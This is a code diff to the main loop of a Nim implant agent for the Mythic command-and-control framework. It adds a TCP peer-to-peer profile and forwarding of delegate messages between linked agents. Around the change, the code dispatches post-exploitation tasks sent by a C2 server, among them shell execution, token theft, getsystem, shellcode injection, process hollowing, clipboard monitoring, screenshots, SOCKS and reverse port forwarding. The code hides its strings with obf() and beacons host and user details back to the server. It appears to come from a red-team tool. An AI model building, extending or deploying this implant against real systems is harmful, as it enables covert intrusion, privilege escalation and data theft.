@@ -1,14 +1,16 @@
-import std/[json, random, os, base64, tables, times, strutils, strformat]
+import std/[json, random, os, base64, tables, times, strutils, strformat, asyncdispatch]
 import config
 import global_data
 import profiles/http_profile
 import profiles/websocket_profile
 import profiles/httpx_profile
 import profiles/dns_profile
+import profiles/tcp_profile
 import utils/sysinfo
 import utils/m_responses
 import utils/debug
 import utils/strenc
+import utils/task_processor
 import tasks/exit
 import tasks/sleep
 import tasks/ls
@@ -29,6 +31,7 @@ import tasks/socks
 import tasks/rpfwd
 import tasks/redirect
 import tasks/getenv as taskGetenv
+import tasks/connect
 
 # Cross-platform commands
 import tasks/portscan
@@ -89,7 +92,7 @@ type
     mtClipboardMonitor, mtPortscan
   
   ProfileKind = enum
-    pkHttp, pkWebSocket, pkHttpx, pkDns
+    pkHttp, pkWebSocket, pkHttpx, pkDns, pkTcp
   
   Profile = object
     case kind: ProfileKind
@@ -101,6 +104,8 @@ type
       httpxProfile: HttpxProfile
     of pkDns:
       dnsProfile: DnsProfile
+    of pkTcp:
+      tcpProfile: TcpProfile
   
   Agent* = ref object
     config: Config
@@ -124,6 +129,8 @@ proc send(profile: var Profile, data: string, callbackUuid: string = ""): string
     result = profile.httpxProfile.send(data, callbackUuid)
   of pkDns:
     result = profile.dnsProfile.send(data, callbackUuid)
+  of pkTcp:
+    result = profile.tcpProfile.send(data, callbackUuid)
 
 proc setAesKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
@@ -135,6 +142,8 @@ proc setAesKey(profile: var Profile, key: seq[byte]) =
     profile.httpxProfile.setAesKey(key)
   of pkDns:
     profile.dnsProfile.setAesKey(key)
+  of pkTcp:
+    profile.tcpProfile.setAesKey(key)
 
 proc setAesDecKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
@@ -146,6 +155,8 @@ proc setAesDecKey(profile: var Profile, key: seq[byte]) =
     profile.httpxProfile.setAesDecKey(key)
   of pkDns:
     profile.dnsProfile.setAesDecKey(key)
+  of pkTcp:
+    profile.tcpProfile.setAesDecKey(key)
 
 proc hasAesKey(profile: Profile): bool =
   case profile.kind
@@ -157,6 +168,8 @@ proc hasAesKey(profile: Profile): bool =
     result = profile.httpxProfile.hasAesKey()
   of pkDns:
     result = profile.dnsProfile.hasAesKey()
+  of pkTcp:
+    result = profile.tcpProfile.hasAesKey()
 
 proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: string] =
   case profile.kind
@@ -168,6 +181,8 @@ proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: str
     result = profile.httpxProfile.performKeyExchange()
   of pkDns:
     result = profile.dnsProfile.performKeyExchange()
+  of pkTcp:
+    result = profile.tcpProfile.performKeyExchange()
 
 proc newAgent*(): Agent =
   ## Create a new agent instance
@@ -187,6 +202,8 @@ proc newAgent*(): Agent =
     result.profile = Profile(kind: pkHttpx, httpxProfile: newHttpxProfile())
   of "dns":
     result.profile = Profile(kind: pkDns, dnsProfile: newDnsProfile())
+  of "tcp":
+    result.profile = Profile(kind: pkTcp, tcpProfile: newTcpProfile())
   else:  # Default to HTTP for "http" or any other value
     result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
   
@@ -227,26 +244,10 @@ proc newAgent*(): Agent =
   
   debug "[DEBUG] Agent: Initialization complete"
 
+# Reuse buildCheckinInfo from task_processor module
 proc buildCheckinMessage(): JsonNode =
-  ## Build the initial checkin message
-  let sysInfo = getSystemInfo()
-  let cfg = getConfig()
-  
-  result = %*{
-    obf("action"): obf("checkin"),
-    obf("uuid"): cfg.uuid,
-    obf("ips"): sysInfo.ips,
-    obf("os"): sysInfo.os,
-    obf("user"): sysInfo.user,
-    obf("host"): sysInfo.hostname,
-    obf("pid"): sysInfo.pid,
-    obf("architecture"): sysInfo.arch,
-    obf("domain"): sysInfo.domain,
-    obf("integrity_level"): sysInfo.integrityLevel,
-    obf("process_name"): sysInfo.processName,
-    obf("cwd"): sysInfo.cwd,
-    obf("impersonation_context"): nil
-  }
+  ## Build the initial checkin message (uses reusable function)
+  result = buildCheckinInfo()
   
 proc checkin*(agent: Agent): bool =
   ## Perform initial checkin with Mythic
@@ -290,9 +291,9 @@ proc checkin*(agent: Agent): bool =
   
   return false
 
-proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode], rpfwd: seq[JsonNode]] =
+proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode], rpfwd: seq[JsonNode], delegates: seq[JsonNode]] =
   ## Get tasking from Mythic
-  ## Returns tasks, interactive messages, socks messages, and rpfwd messages
+  ## Returns tasks, interactive messages, socks messages, rpfwd messages, and delegates
   ## Also updates agent.callbackUuid if a delayed checkin response is received
   let getTaskingMsg = %*{
     obf("action"): obf("get_tasking"),
@@ -307,12 +308,13 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
     debug "[DEBUG] get_tasking response: ", response
   
   if response.len == 0:
-    return (@[], @[], @[], @[])
+    return (@[], @[], @[], @[], @[])
   
   var tasks: seq[JsonNode] = @[]
   var interactive: seq[JsonNode] = @[]
   var socks: seq[JsonNode] = @[]
   var rpfwd: seq[JsonNode] = @[]
+  var delegates: seq[JsonNode] = @[]
   
   try:
     let respJson = parseJson(response)
@@ -333,10 +335,14 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
       rpfwd = respJson[obf("rpfwd")].getElems()
       debug "[DEBUG] Received " & $rpfwd.len & " rpfwd message(s)"
     
-    return (tasks, interactive, socks, rpfwd)
+    if respJson.hasKey(obf("delegates")):
+      delegates = respJson[obf("delegates")].getElems()
+      debug "[DEBUG] Received " & $delegates.len & " delegate message(s)"
+    
+    return (tasks, interactive, socks, rpfwd, delegates)
   except:
     debug "[DEBUG] Failed to parse tasking: " & getCurrentExceptionMsg()
-    return (@[], @[], @[], @[])
+    return (@[], @[], @[], @[], @[])
 
 
 
@@ -373,8 +379,27 @@ proc processRpfwd*(agent: var Agent, rpfwdMessages: seq[JsonNode]) =
       # Wrap each RPfwd message in the format expected by postResponses
       agent.taskResponses.add(%*{obf("rpfwd"): [response]})
 
+proc processDelegates*(agent: var Agent, delegates: seq[JsonNode]) =
+  ## Process delegate messages (P2P agent communications)
+  ## Delegates are messages from Mythic that need to be forwarded to linked P2P agents
+  if delegates.len > 0:
+    debug "[DEBUG] Processing " & $delegates.len & " delegate message(s)"
+    
+    # Forward delegates to appropriate linked agents via their connection
+    for delegate in delegates:
+      if delegate.hasKey(obf("uuid")) and delegate.hasKey(obf("message")):
+        let uuid = delegate[obf("uuid")].getStr()
+        let message = delegate[obf("message")].getStr()
+        debug "[DEBUG] Delegate message for linked agent: ", uuid
+        
+        # Try to forward to connect connection
+        if not forwardDelegateToConnect(uuid, message):
+          debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
+      else:
+        debug "[DEBUG] Malformed delegate message - missing uuid or message"
+
 proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
-  ## Process received tasks
+  ## Process received tasks using the unified task_processor
   for task in tasks:
     let taskId = task[obf("id")].getStr()
     let command = task[obf("command")].getStr()
@@ -395,81 +420,38 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
         except:
           debug "[DEBUG] Failed to parse parameters: " & paramStr
     
-    debug "[DEBUG] === PROCESSING TASK ==="
-    debug "[DEBUG] Task ID: " & taskId
-    debug "[DEBUG] Command: " & command
-    if params.len > 0:
-      debug "[DEBUG] Parameters: " & params.pretty()
-    else:
-      debug "[DEBUG] No parameters"
+    # Execute task using unified task_processor
+    let execResult = executeTask(taskId, command, params)
     
-    # Execute command and get response
-    var response = %*{
-      obf("task_id"): taskId,
-      obf("user_output"): "Command '" & command & "' not yet implemented",
-      obf("completed"): true,
-      obf("status"): "error"
-    }
+    # Handle special cases based on result flags
+    if execResult.shouldExit:
+      agent.shouldExit = true
     
-    try:
-      case command
-      of obf("exit"):
-        debug "[DEBUG] Executing exit command"
-        response = executeExit(params)
-        response[obf("task_id")] = %taskId
-        agent.shouldExit = true
-        
-      of obf("sleep"):
-        debug "[DEBUG] Executing sleep command"
-        response = executeSleep(params, agent.sleepInterval, agent.jitter)
-        response[obf("task_id")] = %taskId
-        
-      of obf("ls"):
-        debug "[DEBUG] Executing ls command"
-        let lsResult = executeLs(params)
-        # ls returns file browser format, need to wrap for task response
-        if lsResult.hasKey(obf("files")):
-          # This is a successful file browser response
-          # Mythic expects it in "file_browser" field
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): obf("completed"),
-            obf("file_browser"): lsResult,
-            obf("user_output"): $lsResult  # Also include as serialized JSON string
-          }
-          debug "[DEBUG] Ls found " & $lsResult["files"].len & " files"
-        else:
-          # This is an error response, already has user_output
-          response = lsResult
-          response[obf("task_id")] = %taskId
-          debug "[DEBUG] Ls returned error: " & response["user_output"].getStr()
+    # Handle sleep command specially (needs to modify agent state)
+    if command == obf("sleep"):
+      let sleepResult = executeSleep(params, agent.sleepInterval, agent.jitter)
+      sleepResult[obf("task_id")] = %taskId
+      agent.taskResponses.add(sleepResult)
+      continue
+    
+    # Handle background tasks that need state tracking
+    if execResult.needsBackgroundTracking:
+      agent.taskResponses.add(execResult.response)
       
+      case command
       of obf("download"):
-        debug "[DEBUG] Starting download"
-        response = executeDownload(taskId, params)
-        agent.taskResponses.add(response)
-        
-        # Track as background task for chunk handling
         var state = BackgroundTaskState(
           taskType: btDownload,
           path: params[obf("path")].getStr(),
-          fileId: "",  # Will be set when we receive it from Mythic
-          totalChunks: response[obf("download")][obf("total_chunks")].getInt(),
+          fileId: "",
+          totalChunks: execResult.response[obf("download")][obf("total_chunks")].getInt(),
           currentChunk: 0
         )
         agent.backgroundTasks[taskId] = state
-        continue
       
       of obf("upload"):
-        debug "[DEBUG] Starting upload"
-        response = executeUpload(taskId, params)
-        agent.taskResponses.add(response)
-        
-        # Track as background task for chunk handling
-        # Extract the full_path from the response which contains the computed UNC path
-        let uploadPath = if response.hasKey(obf("upload")):
-          response[obf("upload")][obf("full_path")].getStr()
+        let uploadPath = if execResult.response.hasKey(obf("upload")):
+          execResult.response[obf("upload")][obf("full_path")].getStr()
         else:
           params[obf("remote_path")].getStr()
         
@@ -477,94 +459,39 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           taskType: btUpload,
           path: uploadPath,
           fileId: params[obf("file")].getStr(),
-          totalChunks: 0,  # Will be set when we receive first chunk
+          totalChunks: 0,
           currentChunk: 1
         )
         agent.backgroundTasks[taskId] = state
-        continue
       
       of obf("execute_assembly"):
         when defined(windows):
-          debug "[DEBUG] Starting execute-assembly (file download)"
-          response = executeAssembly(taskId, params)
-          agent.taskResponses.add(response)
-          
-          # Track as background task for file download
           var state = BackgroundTaskState(
             taskType: btExecuteAssembly,
             path: "",
             fileId: params[obf("uuid")].getStr(),
-            totalChunks: 0,  # Will be set when we receive first chunk
+            totalChunks: 0,
             currentChunk: 1,
             fileData: @[],
             params: params
           )
           agent.backgroundTasks[taskId] = state
-          continue
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("execute_assembly command is only available on Windows")
-          }
       
       of obf("inline_execute"):
         when defined(windows):
-          debug "[DEBUG] Starting inline_execute (BOF download)"
-          response = inlineExecute(taskId, params)
-          agent.taskResponses.add(response)
-          
-          # Track as background task for file download
           var state = BackgroundTaskState(
             taskType: btInlineExecute,
             path: "",
             fileId: params[obf("uuid")].getStr(),
-            totalChunks: 0,  # Will be set when we receive first chunk
+            totalChunks: 0,
             currentChunk: 1,
             fileData: @[],
             params: params
           )
           agent.backgroundTasks[taskId] = state
-          continue
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("inline_execute command is only available on Windows")
-          }
-      
-      of obf("powerpick"):
-        when defined(windows):
-          debug "[DEBUG] Executing powerpick command"
-          response = powerpick(taskId, params)
-          response[obf("task_id")] = %taskId
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("powerpick command is only available on Windows")
-          }
-      
-      of obf("run"):
-        debug "[DEBUG] Executing run command"
-        response = run(taskId, params)
-        response[obf("task_id")] = %taskId
-      
-      of obf("shell"):
-        debug "[DEBUG] Executing shell command (alias for run)"
-        response = run(taskId, params)
-        response[obf("task_id")] = %taskId
       
       of obf("shinject"):
         when defined(windows):
-          debug "[DEBUG] Starting shinject (shellcode download)"
-          response = shinject(taskId, params)
-          agent.taskResponses.add(response)
-          
-          # Track as background task for file download
           var state = BackgroundTaskState(
             taskType: btShinject,
             path: "",
@@ -575,346 +502,9 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
             params: params
           )
           agent.backgroundTasks[taskId] = state
-          continue
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("shinject command is only available on Windows")
-          }
-      
-      of obf("whoami"):
-        debug "[DEBUG] Executing whoami command"
-        response = whoami(taskId, $params)
-      
-      of obf("cat"):
-        debug "[DEBUG] Executing cat command"
-        response = catFile(taskId, $params)
-      
-      of obf("mkdir"):
-        debug "[DEBUG] Executing mkdir command"
-        response = makeDirectory(taskId, $params)
-      
-      of obf("cp"):
-        debug "[DEBUG] Executing cp command"
-        response = cpFile(taskId, $params)
-      
-      of obf("mv"):
-        debug "[DEBUG] Executing mv command"
-        response = mvFile(taskId, $params)
-      
-      of obf("cd"):
-        debug "[DEBUG] Executing cd command"
-        response = changeDirectory(taskId, $params)
-      
-      of obf("ps"):
-        debug "[DEBUG] Executing ps command"
-        response = ps($params)
-        response[obf("task_id")] = %taskId
-      
-      of obf("pwd"):
-        debug "[DEBUG] Executing pwd command"
-        response = pwd(taskId, params)
-      
-      of obf("rm"):
-        debug "[DEBUG] Executing rm command"
-        response = rm(taskId, params)
-      
-      of obf("pty"):
-        debug "[DEBUG] Executing pty command"
-        response = pty(taskId, params)
-        # PTY sessions don't complete immediately
-        if response.hasKey(obf("status")) and response[obf("status")].getStr() == obf("processing"):
-          agent.taskResponses.add(response)
-          continue
-      
-      of obf("make_token"):
-        when defined(windows):
-          debug "[DEBUG] Executing make_token command"
-          response = makeToken(taskId, params)
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("make_token command is only available on Windows")
-          }
-      
-      of obf("steal_token"):
-        when defined(windows):
-          debug "[DEBUG] Executing steal_token command"
-          response = stealToken(taskId, params)
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("steal_token command is only available on Windows")
-          }
-      
-      of obf("rev2self"):
-        when defined(windows):
-          debug "[DEBUG] Executing rev2self command"
-          response = rev2self(taskId, params)
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("rev2self command is only available on Windows")
-          }
-      
-      of obf("runas"):
-        when defined(windows):
-          debug "[DEBUG] Executing runas command"
-          response = runas(taskId, params)
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("runas command is only available on Windows")
-          }
-      
-      of obf("getsystem"):
-        when defined(windows):
-          debug "[DEBUG] Executing getsystem command"
-          response = getsystem(taskId, params)
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("getsystem command is only available on Windows")
-          }
-      
-      of obf("getprivs"):
-        when defined(windows):
-          debug "[DEBUG] Executing getprivs command"
-          response = getprivs(taskId, params)
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("getprivs command is only available on Windows")
-          }
-      
-      of obf("getenv"):
-        debug "[DEBUG] Executing getenv command"
-        response = taskGetenv.getenv(taskId, params)
-      
-      of obf("listpipes"):
-        when defined(windows):
-          debug "[DEBUG] Executing listpipes command"
-          response = listpipes(taskId, params)
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("listpipes command is only available on Windows")
-          }
-      
-      of obf("ifconfig"):
-        debug "[DEBUG] Executing ifconfig command"
-        response = ifconfig(taskId, params)
-      
-      of obf("netstat"):
-        debug "[DEBUG] Executing netstat command"
-        response = netstat(taskId, params)
-      
-      of obf("scshell"):
-        when defined(windows):
-          debug "[DEBUG] Executing scshell command"
-          response = scshell(taskId, params)
-        else:
-          response = mythicError(taskId, obf("scshell is only available on Windows"))
-      
-      of obf("config"):
-        debug "[DEBUG] Executing config command"
-        response = taskConfig.config(taskId, params)
-      
-      of obf("pkill"):
-        debug "[DEBUG] Executing pkill command"
-        response = pkill(taskId, params)
-      
-      of obf("spawnto_x64"):
-        when defined(windows):
-          debug "[DEBUG] Executing spawnto_x64 command"
-          response = spawnto_x64(taskId, params)
-        else:
-          response = mythicError(taskId, obf("spawnto_x64 is only available on Windows"))
-      
-      of obf("spawnto_x86"):
-        when defined(windows):
-          debug "[DEBUG] Executing spawnto_x86 command"
-          response = spawnto_x86(taskId, params)
-        else:
-          response = mythicError(taskId, obf("spawnto_x86 is only available on Windows"))
-      
-      of obf("ppid"):
-        when defined(windows):
-          debug "[DEBUG] Executing ppid command"
-          response = ppid(taskId, params)
-        else:
-          response = mythicError(taskId, obf("ppid is only available on Windows"))
-      
-      of obf("reg_query"):
-        when defined(windows):
-          debug "[DEBUG] Executing reg_query command"
-          response = regQuery(taskId, params)
-        else:
-          response = mythicError(taskId, obf("reg_query is only available on Windows"))
-      
-      of obf("reg_write_value"):
-        when defined(windows):
-          debug "[DEBUG] Executing reg_write_value command"
-          response = regWriteValue(taskId, params)
-        else:
-          response = mythicError(taskId, obf("reg_write_value is only available on Windows"))
-      
-      of obf("net_dclist"):
-        when defined(windows):
-          debug "[DEBUG] Executing net_dclist command"
-          response = netDclist(taskId, params)
-        else:
-          response = mythicError(taskId, obf("net_dclist is only available on Windows"))
-      
-      of obf("net_localgroup"):
-        when defined(windows):
-          debug "[DEBUG] Executing net_localgroup command"
-          response = netLocalgroup(taskId, params)
-        else:
-          response = mythicError(taskId, obf("net_localgroup is only available on Windows"))
-      
-      of obf("net_localgroup_member"):
-        when defined(windows):
-          debug "[DEBUG] Executing net_localgroup_member command"
-          response = netLocalgroupMember(taskId, params)
-        else:
-          response = mythicError(taskId, obf("net_localgroup_member is only available on Windows"))
-      
-      of obf("net_shares"):
-        when defined(windows):
-          debug "[DEBUG] Executing net_shares command"
-          response = netShares(taskId, params)
-        else:
-          response = mythicError(taskId, obf("net_shares is only available on Windows"))
-      
-      of obf("get_av"):
-        when defined(windows):
-          debug "[DEBUG] Executing get_av command"
-          response = getAv(taskId, params)
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("get_av command is only available on Windows")
-          }
-      
-      of obf("screenshot"):
-        when defined(windows):
-          debug "[DEBUG] Starting screenshot capture"
-          response = screenshot(taskId, params)
-          if response.hasKey(obf("download")):
-            # This is a background task - store screenshot data for chunking
-            agent.taskResponses.add(response)
-            
-            # Track as background task
-            let decodedStr = decode(response[obf("screenshot_data")].getStr())
-            var dataBytes = newSeq[byte](decodedStr.len)
-            for i in 0..<decodedStr.len:
-              dataBytes[i] = decodedStr[i].byte
-            
-            var state = BackgroundTaskState(
-              taskType: btDownload,  # Reuse download for screenshots
-              path: obf("screenshot.bmp"),
-              fileId: "",
-              totalChunks: response[obf("download")][obf("total_chunks")].getInt(),
-              currentChunk: 0,
-              fileData: dataBytes
-            )
-            agent.backgroundTasks[taskId] = state
-            response.delete(obf("screenshot_data"))  # Don't send raw data to Mythic
-            continue
-        else:
-          # Windows-only command on non-Windows platform
-          response = %*{
-            obf("task_id"): taskId,
-            obf("user_output"): obf("screenshot command is only available on Windows"),
-            obf("completed"): true,
-            obf("status"): "error"
-          }
-      
-      of obf("socks"):
-        debug "[DEBUG] Executing socks command"
-        response = socks(taskId, params)
-        # SOCKS sessions don't complete immediately
-        if response.hasKey(obf("status")) and response[obf("status")].getStr() == obf("processing"):
-          agent.taskResponses.add(response)
-          continue
-      
-      of obf("rpfwd"):
-        debug "[DEBUG] Executing rpfwd command"
-        response = rpfwd(taskId, params)
-        # RPfwd sessions don't complete immediately
-        if response.hasKey(obf("status")) and response[obf("status")].getStr() == obf("processing"):
-          agent.taskResponses.add(response)
-          continue
-      
-      of obf("redirect"):
-        debug "[DEBUG] Executing redirect command"
-        response = redirect(taskId, params)
-        # Redirect completes immediately (runs entirely in background threads)
-      
-      of obf("portscan"):
-        debug "[DEBUG] Starting portscan (background task)"
-        response = portscan(taskId, params)
-        # Track as background task if processing
-        if response.hasKey(obf("status")) and response[obf("status")].getStr() == obf("processing"):
-          agent.activeMonitoringTasks[taskId] = mtPortscan
-          agent.taskResponses.add(response)
-          continue
-      
-      of obf("clipboard"):
-        when defined(windows):
-          debug "[DEBUG] Executing clipboard command"
-          response = clipboard(taskId, params)
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("clipboard command is only available on Windows")
-          }
-      
-      of obf("clipboard_monitor"):
-        when defined(windows):
-          debug "[DEBUG] Starting clipboard_monitor (background task)"
-          response = clipboardMonitor(taskId, params)
-          # Track as background task if processing
-          if response.hasKey(obf("status")) and response[obf("status")].getStr() == obf("processing"):
-            agent.activeMonitoringTasks[taskId] = mtClipboardMonitor
-            agent.taskResponses.add(response)
-            continue
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("clipboard_monitor command is only available on Windows")
-          }
       
       of obf("donut"):
         when defined(windows):
-          debug "[DEBUG] Starting donut execution"
-          response = donut(taskId, params)
-          agent.taskResponses.add(response)
-          
-          # Track as background task for file download
           var state = BackgroundTaskState(
             taskType: btDonut,
             path: "",
@@ -925,22 +515,9 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
             params: params
           )
           agent.backgroundTasks[taskId] = state
-          continue
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("donut command is only available on Windows")
-          }
       
       of obf("inject_hollow"):
         when defined(windows):
-          debug "[DEBUG] Starting inject_hollow"
-          response = injectHollow(taskId, params)
-          agent.taskResponses.add(response)
-          
-          # Track as background task for file download
           var state = BackgroundTaskState(
             taskType: btInjectHollow,
             path: "",
@@ -951,38 +528,38 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
             params: params
           )
           agent.backgroundTasks[taskId] = state
-          continue
-        else:
-          response = %*{
-            obf("task_id"): taskId,
-            obf("completed"): true,
-            obf("status"): "error",
-            obf("user_output"): obf("inject_hollow command is only available on Windows")
-          }
+      
+      of obf("screenshot"):
+        when defined(windows):
+          # Screenshot doesn't use BackgroundTaskState, handled elsewhere
+          discard
       
       else:
-        # Command not implemented
-        debug "[DEBUG] Command not implemented: " & command
+        discard
+      
+      continue
     
-    except Exception as e:
-      debug "[DEBUG] Task execution error: " & e.msg
-      response = %*{
-        obf("task_id"): taskId,
-        obf("user_output"): "Error executing command: " & e.msg,
-        obf("completed"): true,
-        obf("status"): "error"
-      }
+    # Handle tasks that need monitoring (pty, socks, rpfwd, connect, etc.)
+    # These return status="processing" and don't complete immediately
+    if execResult.response.hasKey(obf("status")):
+      let status = execResult.response[obf("status")].getStr()
+      if status == obf("processing"):
+        agent.taskResponses.add(execResult.response)
+        continue
     
-    if response.hasKey(obf("status")):
-      debug "[DEBUG] Task result status: ", response["status"].getStr()
-    if response.hasKey(obf("user_output")):
-      let output = response[obf("user_output")].getStr()
-      if output.len < 200:
-        debug "[DEBUG] Task output: ", output
-      else:
-        debug "[DEBUG] Task output length: ", output.len, " bytes (first 100 chars): ", output[0..<min(100, output.len)]
+    # Handle monitoring tasks (clipboard_monitor, portscan)
+    case command
+    of obf("clipboard_monitor"):
+      when defined(windows):
+        agent.activeMonitoringTasks[taskId] = mtClipboardMonitor
+    of obf("portscan"):
+      agent.activeMonitoringTasks[taskId] = mtPortscan
+    else:
+      discard
     
-    agent.taskResponses.add(response)
+    # Add response for all other tasks
+    agent.taskResponses.add(execResult.response)
+    
 
 proc checkBackgroundTasks*(agent: var Agent) =
   ## Check all active monitoring tasks (clipboard_monitor, portscan)
@@ -1017,11 +594,12 @@ proc postResponses*(agent: var Agent) =
   debug "[DEBUG] === POSTING RESPONSES ==="
   debug "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
   
-  # Separate interactive, socks, and rpfwd messages from regular responses
+  # Separate interactive, socks, rpfwd, and delegate messages from regular responses
   var regularResponses: seq[JsonNode] = @[]
   var interactiveMessages: seq[JsonNode] = @[]
   var socksMessages: seq[JsonNode] = @[]
   var rpfwdMessages: seq[JsonNode] = @[]
+  var delegateMessages: seq[JsonNode] = @[]
   
   for resp in agent.taskResponses:
     if resp.hasKey(obf("interactive")):
@@ -1049,6 +627,15 @@ proc postResponses*(agent: var Agent) =
       for msg in messages:
         rpfwdMessages.add(msg)
       # Don't add the rpfwd wrapper to responses
+    elif resp.hasKey(obf("delegates")):
+      # Extract delegate messages and add to top-level array
+      let messages = resp[obf("delegates")].getElems()
+      for msg in messages:
+        delegateMessages.add(msg)
+      # Don't add the delegate wrapper to responses
+    elif resp.hasKey(obf("edges")):
+      # Pass through edge notifications (for link/unlink)
+      regularResponses.add(resp)
     else:
       regularResponses.add(resp)
   
@@ -1070,16 +657,52 @@ proc postResponses*(agent: var Agent) =
   if rpfwdMessages.len > 0:
     postMsg[obf("rpfwd")] = %rpfwdMessages
   
+  # Add delegate messages at top level if any
+  if delegateMessages.len > 0:
+    postMsg[obf("delegates")] = %delegateMessages
+    debug "[DEBUG] Sending ", delegateMessages.len, " delegate message(s) to Mythic"
+  
   let response = agent.profile.send($postMsg, agent.callbackUuid)
   
   debug "[DEBUG] Responses posted successfully"
   
   agent.taskResponses = @[]
   
-  # Handle background task responses (file_id, chunks, etc.)
+  # Handle background task responses (file_id, chunks, etc.) and delegates
   if response.len > 0:
     try:
       let respJson = parseJson(response)
+      
+      # Forward any delegates to connected P2P agents
+      if respJson.hasKey(obf("delegates")):
+        let delegates = respJson[obf("delegates")]
+        for delegate in delegates:
+          let delegateUuid = delegate[obf("uuid")].getStr()
+          let delegateMessage = delegate[obf("message")].getStr()
+          debug "[DEBUG] Received delegate for ", delegateUuid, " (", delegateMessage.len, " bytes base64)"
+          
+          # Check if Mythic assigned a new UUID (happens on checkin response)
+          if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
+            let newUuid = if delegate.hasKey(obf("new_uuid")): 
+              delegate[obf("new_uuid")].getStr() 
+            else: 
+              delegate[obf("mythic_uuid")].getStr()
+            
+            if newUuid != delegateUuid:
+              debug "[DEBUG] Mythic assigned new UUID: ", newUuid, " (old: ", delegateUuid, ")"
+              # Re-key the connection from old UUID to new UUID
+              discard rekeyConnectConnection(delegateUuid, newUuid)
+          
+          # Forward to the connect task handler (using potentially updated UUID)
+          let targetUuid = if delegate.hasKey(obf("new_uuid")): 
+            delegate[obf("new_uuid")].getStr() 
+          elif delegate.hasKey(obf("mythic_uuid")):
+            delegate[obf("mythic_uuid")].getStr()
+          else:
+            delegateUuid
+          
+          discard forwardDelegateToConnect(targetUuid, delegateMessage)
+      
       if respJson.hasKey(obf("responses")):
         for taskResp in respJson[obf("responses")]:
           let taskId = taskResp[obf("task_id")].getStr()
@@ -1324,6 +947,18 @@ proc runAgent*() =
   # Initialize agent
   var agentInstance = newAgent()
   
+  # TCP profile is special - it runs its own listener loop instead of normal agent loop
+  if cfg.profile == "tcp":
+    debug "[DEBUG] runAgent: TCP profile detected, starting P2P listener"
+    # TCP profile doesn't do normal checkin - clients connect to it
+    # Run the TCP listener loop
+    case agentInstance.profile.kind
+    of pkTcp:
+      waitFor agentInstance.profile.tcpProfile.start()
+    else:
+      discard
+    return
+  
   debug "[DEBUG] runAgent: Agent instance created, starting checkin..."
   
   # Perform initial checkin
@@ -1335,8 +970,8 @@ proc runAgent*() =
   
   # Main agent loop
   while not agentInstance.shouldExit:
-    # Get tasking from Mythic (returns tasks, interactive, socks, and rpfwd messages)
-    let (tasks, interactive, socksMessages, rpfwdMessages) = agentInstance.getTasks()
+    # Get tasking from Mythic (returns tasks, interactive, socks, rpfwd messages, and delegates)
+    let (tasks, interactive, socksMessages, rpfwdMessages, delegates) = agentInstance.getTasks()
     
     # Process interactive messages first (PTY input)
     agentInstance.processInteractive(interactive)
@@ -1346,6 +981,9 @@ proc runAgent*() =
     
     # Process RPfwd messages (data forwarding)
     agentInstance.processRpfwd(rpfwdMessages)
+    
+    # Process delegate messages (P2P agent forwarding)
+    agentInstance.processDelegates(delegates)
     
     # Process tasks
     agentInstance.processTasks(tasks)
@@ -1364,6 +1002,11 @@ proc runAgent*() =
     let rpfwdResponses = checkActiveRpfwdConnections()
     for response in rpfwdResponses:
       agentInstance.taskResponses.add(%*{obf("rpfwd"): [response]})
+    
+    # Check active connect connections for data (non-blocking via threads)
+    let connectResponses = checkActiveConnectConnections()
+    for response in connectResponses:
+      agentInstance.taskResponses.add(response)
     
     # Check background tasks (clipboard_monitor, portscan)
     agentInstance.checkBackgroundTasks()
